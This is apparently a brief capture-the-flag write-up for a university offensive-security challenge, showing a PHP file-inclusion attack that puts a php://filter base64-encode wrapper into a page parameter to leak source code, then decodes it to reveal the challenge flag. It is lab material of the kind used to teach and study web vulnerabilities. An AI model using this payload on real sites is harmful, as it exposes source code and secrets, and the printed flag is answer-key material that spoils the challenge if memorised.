# injection

The solution was to enter this into the URL: `php://filter/convert.base64-encode/resource=flag`
where `http://offsec-chalbroker.osiris.cyber.nyu.edu:1243/index.php?page=flag` becomes `http://offsec-chalbroker.osiris.cyber.nyu.edu:1243/index.php?page=php://filter/convert.base64-encode/resource=flag`

The result is a base64 encoded string of the source code for this page:
`PD9waHAKLy9mbGFne3BocF8xbmNsdWQzXzFzX3MwX3czMXJkXzMyZDQwNDE2NDQxMX0KPz4KVGhlIGZsYWcgaXMganVzdCBhYm92ZSB0aGlzIGxpbmUgKGluIHRoZSBzb3VyY2UgY29kZSBhdCBsZWFzdCkh`

And when decoded...
`echo "PD9waHAKLy9mbGFne3BocF8xbmNsdWQzXzFzX3MwX3czMXJkXzMyZDQwNDE2NDQxMX0KPz4KVGhlIGZsYWcgaXMganVzdCBhYm92ZSB0aGlzIGxpbmUgKGluIHRoZSBzb3VyY2UgY29kZSBhdCBsZWFzdCkh" | base64 -D`

Gives us the flag:

`<?php
//flag{php_1nclud3_1s_s0_w31rd_32d404164411}
?>
The flag is just above this line (in the source code at least)!`
